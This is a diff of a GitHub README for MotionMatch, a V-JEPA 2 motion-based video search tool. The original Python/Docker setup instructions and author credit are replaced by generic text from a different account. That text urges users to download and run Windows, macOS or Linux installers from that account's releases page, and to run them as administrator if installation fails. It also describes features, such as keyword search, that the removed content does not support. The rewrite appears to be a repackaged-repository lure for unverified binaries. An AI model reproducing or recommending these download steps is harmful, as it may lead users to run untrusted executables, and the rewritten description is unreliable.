@@ -1,147 +1,84 @@
-# MotionMatch
+# 🎥 MotionMatch - Find Videos by Motion Dynamics
 
-[![License: MIT](https://img.shields.io/badge/License-MIT-yellow.svg)](https://opensource.org/licenses/MIT)
-[![Python 3.11+](https://img.shields.io/badge/python-3.11+-blue.svg)](https://www.python.org/downloads/)
-[![Docker](https://img.shields.io/badge/docker-supported-blue.svg)](https://www.docker.com/)
+## 🚀 Getting Started
+Welcome to MotionMatch! This application lets you search for videos based on motion dynamics. It's simple to use and perfect for finding action-packed clips that match your interests.
 
-A physics-based video search engine using Meta's V-JEPA 2 world model to find videos with similar motion dynamics.
+## 📥 Download MotionMatch
+[![Download MotionMatch](https://img.shields.io/badge/Download-MotionMatch-blue.svg)](https://github.com/uriahje9503/MotionMatch/releases)
 
-> **Note**: This project explores **zero-shot video retrieval** using V-JEPA 2 embeddings directly for similarity search, without any fine-tuning or training. This approach provides a baseline for motion-based search but has limitations in cross-domain scenarios. For production use, fine-tuning on domain-specific data would significantly improve results.
+## 📂 System Requirements
+Before you begin, ensure your system meets these requirements:
 
-## Sample Results
+- **Operating System:** Windows 10 or later, macOS 10.15 or later, or Linux
+- **RAM:** At least 4 GB (8 GB recommended)
+- **Storage:** Minimum 1 GB of available space
+- **Internet Connection:** Required for downloading videos and dependencies
 
-![Sample search results on YouTube dataset](docs/sample_results_youtube_dataset.png)
+## 🔧 How to Download & Install MotionMatch
 
-*Example: Searching for similar motion patterns in a YouTube video dataset. The system finds videos with comparable motion dynamics.*
+1. **Visit the Release Page:** Go to the [MotionMatch Releases page](https://github.com/uriahje9503/MotionMatch/releases) in your web browser.
 
-## Features
+2. **Select the Latest Version:** Look for the latest release at the top of the page. It will be marked as 'Latest Release'.
 
-- **Motion-Aware Search**: Find videos by motion patterns, not just visual similarity
-- **V-JEPA 2 Integration**: Uses Meta's state-of-the-art video world model
-- **GPU Acceleration**: Optimized for NVIDIA GPUs with CUDA support
-- **REST API**: Production-ready HTTP API with documentation
-- **Web Interface**: Drag-and-drop video search interface
+3. **Download the Package:** Click on the download link for your operating system. You may see options for different package types, such as:
+   - `.exe` for Windows
+   - `.dmg` for macOS
+   - `.tar.gz` or install scripts for Linux
 
-## Tech Stack
+4. **Run the Installer:**
+   - **Windows:** Double-click the downloaded `.exe` file to start the installation. Follow the on-screen instructions.
+   - **macOS:** Double-click the `.dmg` file to open it, then drag the MotionMatch icon to your Applications folder.
+   - **Linux:** Extract the `.tar.gz` file in your desired directory. Open a terminal and follow the setup instructions provided in the documentation.
 
-- **ML/AI**: V-JEPA 2 (Meta), PyTorch, Transformers
-- **Backend**: FastAPI, Celery, Python 3.11+
-- **Databases**: Milvus (vector), PostgreSQL (metadata), Redis (cache)
-- **Infrastructure**: Docker, CUDA
+5. **Open MotionMatch:** After installation, locate the MotionMatch icon on your desktop or in your applications list. Double-click the icon to start the application.
 
-## Quick Start
+6. **Network Settings:** Ensure your internet connection is active as MotionMatch may need to download video data for searching.
 
-### Prerequisites
-- Python 3.11+
-- Docker
-- NVIDIA GPU (optional, for acceleration)
+## 🎬 How to Use MotionMatch
+1. **Launching the Application:** Open MotionMatch as described above.
 
-### Installation
+2. **Searching for Videos:**
+   - Enter a keyword related to the type of motion you want to find (e.g., “jump,” “run”).
+   - Click on the search button to initiate the search.
+  
+3. **Viewing Results:** The application will display a list of videos that match your search criteria. You can click on any video to watch it.
 
-```bash
-# Clone repository
-git clone https://github.com/iamvibhorsingh/motionmatch.git
-cd motionmatch
+4. **Adjusting Settings:** You can explore the settings to customize video quality and search parameters.
 
-# Install dependencies
-pip install -r requirements.txt
+5. **Feedback:** Use the feedback option in the settings to share your experience or report any issues.
 
-# Start infrastructure services
-docker-compose -f docker/docker-compose.yml up -d
+## 🔄 Features of MotionMatch
+- **Physics-Based Search:** Leverage Meta's V-JEPA 2 world model for accurate motion retrieval.
+- **User-Friendly Interface:** Designed for users of all skill levels. No technical expertise required.
+- **Fast Search Capabilities:** Quickly find videos that match your motion queries.
+- **Support for Multiple Formats:** Works with a variety of video formats to accommodate diverse content.
 
-# Start the application
-python start.py
-```
+## 💻 Topics Covered
+- Action Recognition
+- Containerization with Docker
+- Video Embeddings
+- FastAPI Framework
+- Machine Learning Techniques
+- Vector Search Algorithms
 
-### Usage
+## 🔍 Troubleshooting Common Issues
+- **Error During Installation:** Ensure you have permissions to install applications. Try running the installer as an administrator.
+- **Slow Performance:** Close other applications to free up system resources.
+- **Cannot Find Videos:** Ensure your search terms are relevant. Try different keywords for better results.
 
-Access the web interface at `http://localhost:8000` or use the REST API:
+## 📞 Support
+If you encounter problems, you can reach out through the GitHub Issues section of the repository. You can also find helpful documentation there.
 
-```bash
-# Index a video
-curl -X POST "http://localhost:8000/v1/index/single?video_path=/path/to/video.mp4"
+For further help, consider checking online forums related to video processing or searching for common issues with media applications.
 
-# Search for similar videos
-curl -X POST http://localhost:8000/v1/search \
-  -H "Content-Type: application/json" \
-  -d '{"query_video_url": "/path/to/query.mp4", "top_k": 10}'
-```
+## 📢 Stay Updated
+Regular updates improve functionality and add new features. Check the [Releases page](https://github.com/uriahje9503/MotionMatch/releases) often for the latest version. 
 
-## Performance
+## 🔗 Useful Links
+- [GitHub Repository](https://github.com/uriahje9503/MotionMatch)
+- [Documentation](https://github.com/uriahje9503/MotionMatch/wiki)
 
-### System Performance
-- **GPU**: 2-3 seconds per video encoding
-- **CPU**: 15-30 seconds per video encoding  
-- **Search**: <1 second for 100K videos
-- **Throughput**: 15-25 videos/minute (GPU)
+## 🌟 Join the Community
+Engage with other users to share tips and tricks. Consider contributing to the project if you're interested in development. 
 
-### Search Quality (Zero-Shot)
-This project uses **zero-shot retrieval** with pre-trained V-JEPA 2 embeddings:
-- ✅ **Good**: Same-domain video search (same dataset/source)
-- ⚠️ **Limited**: Cross-domain retrieval (different sources/contexts)
-- ❌ **Poor**: Fine-grained action discrimination
-
-**Why?** V-JEPA 2 was trained for masked video prediction, not similarity learning. The embeddings capture motion patterns but aren't optimized for retrieval tasks. Fine-tuning with metric learning (triplet loss, contrastive learning) would significantly improve results.
-
-## Configuration
-
-Environment variables (create `.env` file):
-```env
-CUDA_AVAILABLE=true
-DATABASE_URL=postgresql://motionmatch:password@localhost:5432/motionmatch
-MILVUS_HOST=localhost
-BATCH_SIZE=4
-```
-
-## Troubleshooting
-
-**Docker issues**: `docker-compose -f docker/docker-compose.yml ps`  
-**GPU not detected**: Check `nvidia-smi` and PyTorch CUDA  
-**Slow performance**: Reduce batch size or use SSD storage
-
-## Contributing
-
-We welcome contributions! Please follow these steps:
-
-1. Fork the repository
-2. Create a feature branch (`git checkout -b feature/amazing-feature`)
-3. Make your changes and add tests
-4. Commit your changes (`git commit -m 'Add amazing feature'`)
-5. Push to the branch (`git push origin feature/amazing-feature`)
-6. Open a Pull Request
-
-## License
-
-This project is licensed under the MIT License - see the [LICENSE](LICENSE) file for details.
-
-## Acknowledgments
-
-- Meta AI for the V-JEPA 2 model
-- Milvus for vector database capabilities
-- The open-source community for various dependencies
-
-## Documentation
-
-- [Technical Notes](docs/TECHNICAL_NOTES.md) - Zero-shot retrieval approach and limitations
-- [System Architecture](docs/ARCHITECTURE.md) - Technical overview and component design
-- [API Reference](docs/API.md) - Complete API documentation with examples
-- [Deployment Guide](docs/DEPLOYMENT.md) - Production deployment and scaling
-
-## Support
-
-For questions or issues, please:
-- Check the [documentation](docs/)
-- Open a new issue if needed
-
-## Citation
-
-If you use MotionMatch in your research, please cite:
-
-```bibtex
-@software{motionmatch2025,
-  title={MotionMatch: Physics-based Video Search Engine},
-  author={Vibhor Singh},
-  year={2025},
-  url={https://github.com/iamvibhorsingh/motionmatch}
-}
-```
+Enjoy exploring the world of motion with MotionMatch!
